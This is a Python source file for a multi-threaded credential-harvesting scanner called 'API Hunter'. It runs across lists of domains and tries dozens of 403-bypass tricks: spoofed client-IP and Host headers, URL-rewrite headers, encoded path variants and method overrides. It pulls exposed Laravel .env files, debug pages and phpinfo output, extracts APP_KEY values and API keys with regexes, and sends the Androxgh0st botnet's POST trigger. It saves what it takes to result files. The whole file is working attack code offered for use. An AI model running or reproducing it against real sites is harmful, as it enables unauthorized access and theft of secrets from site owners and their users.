#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
# RECON ALL — API Hunter Scanner
# Ported from bot.py (API Hunter logic) to standalone CLI module.
# ═══════════════════════════════════════════════════════════════
import os
import re
import json
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, quote

from utils import (
    build_headers,
    safe_text,
    normalize_host,
    rotate_ua,
    make_session,
    API_KEY_PATTERNS,
    PATTERN_PRIORITY,
    ThreadSafeCounter,
    ThreadSafeList,
    append_result,
    print_progress,
    BS4_AVAILABLE,
    BeautifulSoup,
)


# ═══════════════════════════════════════════════════════════════
# 403 BYPASS VARIANT BUILDER
# ═══════════════════════════════════════════════════════════════
def _build_bypass_variants(url: str) -> List[Dict[str, Any]]:
    """Generate URL/header variants for 403 bypass attempts.

    Categories:
        1. IP Source Spoofing
        2. URL Rewrite headers
        3. Path Manipulation
        4. HTTP Method Overrides
        5. Referer/Origin Spoofing
        6. Content-Type tricks
        7. Forwarded Protocol/Port
        8. Cache-Control Bypass
        9. Accept Header Variation
        10. Host Header Manipulation
    """
    parsed = urlparse(url)
    scheme = parsed.scheme
    netloc = parsed.netloc
    path = parsed.path or "/"
    qs = f"?{parsed.query}" if parsed.query else ""
    base = f"{scheme}://{netloc}"

    variants: List[Dict[str, Any]] = []

    def v(label, url=url, headers=None, method="GET", body=None):
        return {"url": url, "headers": headers or {}, "method": method, "label": label, "body": body or {}}

    # ── Category 1: IP Source Spoofing ──
    spoof_ips = ["127.0.0.1", "0.0.0.0", "::1", "10.0.0.1", "172.16.0.1", "192.168.1.1"]
    spoof_headers = [
        "X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Originating-IP", "X-Custom-IP-Authorization", "X-Host", "X-Forwarded-Host",
        "True-Client-IP", "CF-Connecting-IP", "X-Cluster-Client-IP", "Forwarded-For", "Client-IP",
    ]
    for ip in spoof_ips:
        for hdr in spoof_headers:
            variants.append(v(f"[IP-Spoof] {hdr}: {ip}", headers={hdr: ip}))
        variants.append(v(f"[IP-Spoof][Chained] 127.0.0.1 via {ip}", headers={"X-Forwarded-For": f"127.0.0.1, {ip}"}))

    # ── Category 2: URL Rewrite / Override Headers ──
    rewrite_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Path"]
    for rw_hdr in rewrite_headers:
        variants.append(v(f"[URLRewrite] {rw_hdr}: {path}", url=base + "/" + qs, headers={rw_hdr: path}))

    # ── Category 3: Path Manipulation ──
    path_tricks = [
        path + "/", path + "/.", "//" + path.lstrip("/"), path.rstrip("/") + "//",
        path.replace("/", "//"), "/." + path, path + "?", path + "%20", path + "%09",
        path + "%00", path + "/..;/", path + ";/", path + ";param=value",
        path.replace("/", "/%2f"), path.replace("/", "/%2F"), path.replace("/", "/%5c"),
        path.replace("/", "/%5C"), path.replace(".", "%2e"), path.replace(".", "%2E"),
        path + "/%2e%2e/", path + "%252f", quote(path, safe=""), path.upper(), path.lower(), path.swapcase(),
    ]
    last_segment = path.split("/")[-1]
    if "." not in last_segment:
        path_tricks += [path + ".json", path + ".html", path + ".php", path + ".asp", path + ".aspx", path + ".do", path + ".action"]

    seen_paths = {path}
    for p in path_tricks:
        if p and p not in seen_paths:
            seen_paths.add(p)
            new_url = (base + p + qs) if p.startswith("/") else url
            variants.append(v(f"[PathManip] {p}", url=new_url))

    # ── Category 4: HTTP Method Overrides ──
    direct_methods = ["POST", "PUT", "PATCH", "HEAD", "OPTIONS", "DELETE", "TRACE"]
    for method in direct_methods:
        variants.append(v(f"[Method] {method}", method=method))
    override_hdrs = ["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method", "_method"]
    for oh in override_hdrs:
        for method in ["GET", "POST", "PUT", "DELETE"]:
            variants.append(v(f"[MethodHeader] {oh}: {method}", headers={oh: method}, method="GET"))

    # ── Category 5: Referer / Origin Spoofing ──
    referer_values = [
        base + "/", base + path, base + "/admin", base + "/dashboard",
        base + "/internal", "https://google.com/", "https://bing.com/", base,
    ]
    for ref in referer_values:
        variants.append(v(f"[Referer] {ref[:60]}", headers={"Referer": ref, "Origin": base}))

    # ── Category 6: Content-Type Header Tricks ──
    content_types = [
        "application/json", "application/x-www-form-urlencoded", "text/html; charset=utf-8",
        "application/xml", "text/xml", "application/javascript",
        "multipart/form-data; boundary=----WebKitFormBoundary", "*/*",
    ]
    for ct in content_types:
        variants.append(v(f"[ContentType] {ct}", headers={"Content-Type": ct}))

    # ── Category 7: Forwarded Protocol / Port ──
    variants += [
        v("[Proto] X-Forwarded-Proto: https", headers={"X-Forwarded-Proto": "https", "X-Forwarded-Port": "443"}),
        v("[Proto] X-Forwarded-Proto: http", headers={"X-Forwarded-Proto": "http", "X-Forwarded-Port": "80"}),
        v("[Proto] X-Forwarded-Scheme: https", headers={"X-Forwarded-Scheme": "https"}),
    ]

    # ── Category 8: Cache-Control Bypass ──
    cache_controls = ["no-cache", "no-store", "max-age=0", "must-revalidate"]
    for cc in cache_controls:
        variants.append(v(f"[Cache] Cache-Control: {cc}", headers={
            "Cache-Control": cc, "Pragma": "no-cache",
            "If-None-Match": "*", "If-Modified-Since": "0",
        }))

    # ── Category 9: Accept Header Variation ──
    accept_values = [
        "application/json", "application/json, text/plain, */*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "*/*",
        "application/javascript", "text/event-stream", "application/graphql",
    ]
    for acc in accept_values:
        variants.append(v(f"[Accept] {acc[:40]}", headers={"Accept": acc, "X-Requested-With": "XMLHttpRequest"}))

    # ── Category 10: Host Header Manipulation ──
    host_values = [
        parsed.netloc, parsed.hostname or netloc, (parsed.hostname or netloc) + ":443",
        (parsed.hostname or netloc) + ":80", "127.0.0.1", "127.0.0.1:80", "localhost", "localhost:80", "internal",
    ]
    for host in host_values:
        variants.append(v(f"[Host] {host}", headers={"Host": host}))

    return variants


# ═══════════════════════════════════════════════════════════════
# FETCH WITH 403 BYPASS
# ═══════════════════════════════════════════════════════════════
def fetch_with_403_bypass(
    url: str,
    timeout: int = 15,
    try_bypass: bool = True,
    max_bypass: int = 40,
    session: Optional[requests.Session] = None,
) -> Tuple[Optional[bytes], int, str]:
    """Try direct GET first; if 403, attempt bypass variants up to max_bypass."""
    base_headers = {"User-Agent": rotate_ua()}
    caller = session or requests

    try:
        r = caller.get(url, headers=base_headers, timeout=timeout, verify=False, allow_redirects=False)
        if r.status_code != 403:
            return r.content, r.status_code, "direct"
    except requests.RequestException:
        return None, 0, "error"

    if not try_bypass:
        return None, 403, "blocked"

    all_variants = _build_bypass_variants(url)
    variants = all_variants[:max_bypass]

    for vrt in variants:
        time.sleep(0.08)
        h = {"User-Agent": rotate_ua(), **vrt["headers"]}
        method = vrt["method"]
        target = vrt["url"]
        try:
            kwargs = dict(headers=h, timeout=timeout, verify=False, allow_redirects=False)
            if method == "GET":
                r = caller.get(target, **kwargs)
            elif method == "POST":
                r = caller.post(target, data=vrt.get("body", {}), **kwargs)
            elif method == "HEAD":
                r = caller.head(target, **kwargs)
            elif method == "OPTIONS":
                r = caller.options(target, **kwargs)
            else:
                r = caller.request(method, target, **kwargs)
            if r.status_code not in (403, 401, 429, 0):
                return r.content, r.status_code, vrt["label"]
        except requests.RequestException:
            continue

    return None, 403, "all-bypasses-failed"


# ═══════════════════════════════════════════════════════════════
# TEXT / KEY ANALYSIS HELPERS
# ═══════════════════════════════════════════════════════════════
def _extract_context(text: str, match: re.Match, ctx: int = 50) -> str:
    """Extract surrounding context for a regex match."""
    s = max(0, match.start() - ctx)
    e = min(len(text), match.end() + ctx)
    before = text[s:match.start()].replace("\n", " ").strip()[-ctx:]
    after = text[match.end():e].replace("\n", " ").strip()[:ctx]
    return f"...{before}[{match.group(0)}]{after}..."


def scan_for_api_keys(text: str) -> Dict[str, List[Dict]]:
    """Scan text for API key patterns using API_KEY_PATTERNS and PATTERN_PRIORITY."""
    claimed: set = set()
    results: Dict[str, List[Dict]] = {}
    for provider in PATTERN_PRIORITY:
        pattern = API_KEY_PATTERNS.get(provider)
        if not pattern:
            continue
        for match in pattern.finditer(text):
            try:
                value = match.group(1) or match.group(0)
            except IndexError:
                value = match.group(0)
            value = value.strip()
            if not value or value in claimed:
                continue
            claimed.add(value)
            if provider not in results:
                results[provider] = []
            results[provider].append({"value": value, "context": _extract_context(text, match)})
    return results


# ═══════════════════════════════════════════════════════════════
# PARSERS (.env, phpinfo, debug pages)
# ═══════════════════════════════════════════════════════════════
def parse_env_data(body: str) -> Dict[str, Dict[str, str]]:
    """Parse .env file format, group by key prefix."""
    data: Dict[str, Dict[str, str]] = {}
    for line in body.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "=" in line:
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip().strip("\"'")
            prefix = key.split("_")[0].lower() if "_" in key else key.lower()
            if prefix not in data:
                data[prefix] = {}
            data[prefix][key] = value
    return data


def parse_phpinfo(body: str) -> Dict[str, Dict[str, str]]:
    """Parse phpinfo HTML tables for environment vars (needs BeautifulSoup)."""
    if not BS4_AVAILABLE:
        return {}
    try:
        soup = BeautifulSoup(body, "html.parser")
        data: Dict[str, Dict[str, str]] = {}
        for h2 in soup.find_all("h2"):
            if "Environment" in h2.text:
                table = h2.find_next("table")
                if not table:
                    continue
                for tr in table.find_all("tr"):
                    tds = tr.find_all("td")
                    if len(tds) == 2:
                        key = tds[0].text.strip()
                        value = tds[1].text.strip().strip("\"'")
                        prefix = key.split("_")[0].lower() if "_" in key else key.lower()
                        if prefix not in data:
                            data[prefix] = {}
                        data[prefix][key] = value
        return data
    except Exception:
        return {}


def parse_debug_data(body: str) -> Dict[str, Dict[str, str]]:
    """Parse debug page HTML (needs BeautifulSoup)."""
    if not BS4_AVAILABLE:
        return {}
    try:
        soup = BeautifulSoup(body, "html.parser")
        data: Dict[str, Dict[str, str]] = {}
        env_div = soup.find(id="sg-environment-variables")
        if env_div:
            table = env_div.find("table")
            if table:
                for tr in table.find_all("tr"):
                    tds = tr.find_all("td")
                    if len(tds) >= 2:
                        key = tds[0].text.strip()
                        pre = tds[1].find("pre")
                        value = (pre.text if pre else tds[1].text).strip().strip("\"'")
                        prefix = key.split("_")[0].lower() if "_" in key else key.lower()
                        if prefix not in data:
                            data[prefix] = {}
                        data[prefix][key] = value
        return data
    except Exception:
        return {}


# ═══════════════════════════════════════════════════════════════
# RESPONSE ANALYZER
# ═══════════════════════════════════════════════════════════════
def analyze_response_hunter(
    content: bytes,
    url: str,
    bypass_tech: str,
    http_status: int,
    app_root: str,
    timeout: int,
    try_bypass: bool,
    max_bypass: int,
    session: Optional[requests.Session] = None,
) -> Optional[Dict[str, Any]]:
    """Combine all parsers — checks for APP_KEY, phpinfo, debug pages, API keys.

    Also tries POST trigger with ``{'0x[]': 'androxgh0st'}``.
    """
    text = content.decode("utf-8", errors="ignore")
    finding_type = None
    laravel_data = {}

    if "APP_KEY=" in text:
        laravel_data = parse_env_data(text)
        finding_type = "ENV File"
    elif "<td>APP_KEY</td>" in text or '<td class="e">APP_KEY' in text:
        laravel_data = parse_debug_data(text)
        finding_type = "Laravel Debug Page"
    elif '<td class="e">APP_KEY </td>' in text:
        laravel_data = parse_phpinfo(text)
        finding_type = "phpinfo() Exposure"

    api_keys = scan_for_api_keys(text)

    if finding_type or api_keys:
        return {
            "url": url,
            "type": finding_type or "API Keys Only",
            "http_status": http_status,
            "bypass_technique": bypass_tech,
            "laravel_data": laravel_data,
            "api_keys": api_keys,
        }

    # POST trigger attempt
    if try_bypass:
        time.sleep(0.1)
        post_data = {"0x[]": "androxgh0st"}
        try:
            caller = session or requests
            r = caller.post(
                app_root, data=post_data,
                headers={"User-Agent": rotate_ua()},
                timeout=timeout, verify=False, allow_redirects=False,
            )
            if r.status_code < 500 and "APP_KEY" in r.text:
                post_text = r.text
                laravel_data = parse_debug_data(post_text)
                api_keys = scan_for_api_keys(post_text)
                return {
                    "url": url,
                    "type": "Debug POST",
                    "http_status": r.status_code,
                    "bypass_technique": "POST-Trigger",
                    "laravel_data": laravel_data,
                    "api_keys": api_keys,
                }
        except Exception:
            pass

    return None


# ═══════════════════════════════════════════════════════════════
# PER-DOMAIN PROCESSOR
# ═══════════════════════════════════════════════════════════════
def process_domain_hunter(
    domain: str,
    paths: List[str],
    timeout: int,
    try_bypass: bool,
    max_bypass: int,
    session: Optional[requests.Session] = None,
) -> List[Dict[str, Any]]:
    """Scan one domain across all paths."""
    results = []
    if not domain.startswith(("http://", "https://")):
        candidates = [f"https://{domain}", f"http://{domain}"]
    else:
        candidates = [domain]

    active_base = None
    for candidate in candidates:
        content, status, tech = fetch_with_403_bypass(candidate, timeout, try_bypass, max_bypass, session=session)
        if content is not None or status not in (0,):
            active_base = candidate
            break

    if not active_base:
        return results

    app_root = active_base.rstrip("/") + "/"

    for path in paths:
        target_url = app_root.rstrip("/") + path
        path_content, status, bypass_tech = fetch_with_403_bypass(
            target_url, timeout, try_bypass, max_bypass, session=session,
        )
        if path_content is None:
            continue
        finding = analyze_response_hunter(
            path_content, target_url, bypass_tech, status,
            app_root, timeout, try_bypass, max_bypass, session=session,
        )
        if finding:
            results.append(finding)

    return results


# ═══════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════
def run_api_hunter(
    domains: List[str],
    threads: int,
    timeout: int,
    paths: List[str],
    try_bypass: bool,
    max_bypass: int,
    output_dir: str,
) -> List[str]:
    """Run the API Hunter across all domains.

    - Pre-flight liveness check for each domain
    - ThreadPoolExecutor-based concurrency
    - Saves findings as JSON to ``output_dir/api_hunter_all.txt``
      and flat URLs to ``output_dir/api_keys_found.txt``
    - Returns list of finding strings (JSON lines)
    """
    total = len(domains)
    if total == 0:
        print("  ❌  No domains to scan.")
        return []

    print(f"  🕵️  API Hunter — {total:,} domains, {threads} threads, bypass={'ON' if try_bypass else 'OFF'}")

    findings = ThreadSafeList()
    counter = ThreadSafeCounter()
    start_t = time.time()

    session = make_session(threads)

    def worker(domain: str):
        try:
            # Pre-flight liveness check
            headers = build_headers()
            alive = False
            for proto in ("http", "https"):
                try:
                    session.get(f"{proto}://{domain}/", headers=headers, timeout=10, allow_redirects=True)
                    alive = True
                    break
                except Exception:
                    continue
            if not alive:
                counter.increment()
                return

            res = process_domain_hunter(domain, paths, timeout, try_bypass, max_bypass, session=session)
            for finding in res:
                line_val = json.dumps(finding, ensure_ascii=False)
                findings.append(line_val)
                # Incremental save
                all_path = os.path.join(output_dir, "api_hunter_all.txt")
                append_result(all_path, line_val)
        except Exception:
            pass
        finally:
            counter.increment()
            # Print progress periodically (every 50 or on completion)
            c = counter.value
            if c % max(1, total // 20) == 0 or c >= total:
                elapsed = time.time() - start_t
                speed = c / elapsed if elapsed > 0 else 0
                print_progress(c, total, prefix="API Hunter", suffix=f"| 💎 {len(findings)} hits | ⚡ {speed:.1f}/s")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, d) for d in domains]
        for f in as_completed(futures):
            pass  # exceptions handled inside worker

    session.close()
    elapsed = time.time() - start_t

    # ── Collect results ──
    result_lines = findings.copy()

    # Save full JSON findings
    all_path = os.path.join(output_dir, "api_hunter_all.txt")
    os.makedirs(output_dir, exist_ok=True)

    # Save flat unique URLs
    flat_urls = []
    for line in result_lines:
        try:
            item = json.loads(line)
            url = item.get("url")
            if url:
                flat_urls.append(url)
        except Exception:
            pass
    flat_urls = sorted(set(flat_urls))

    flat_path = os.path.join(output_dir, "api_keys_found.txt")
    try:
        with open(flat_path, "w", encoding="utf-8") as f:
            f.write("\n".join(flat_urls) + "\n" if flat_urls else "")
    except Exception:
        pass

    print(f"\n  ✅  API Hunter done — {len(flat_urls)} findings in {elapsed:.1f}s")

    return result_lines
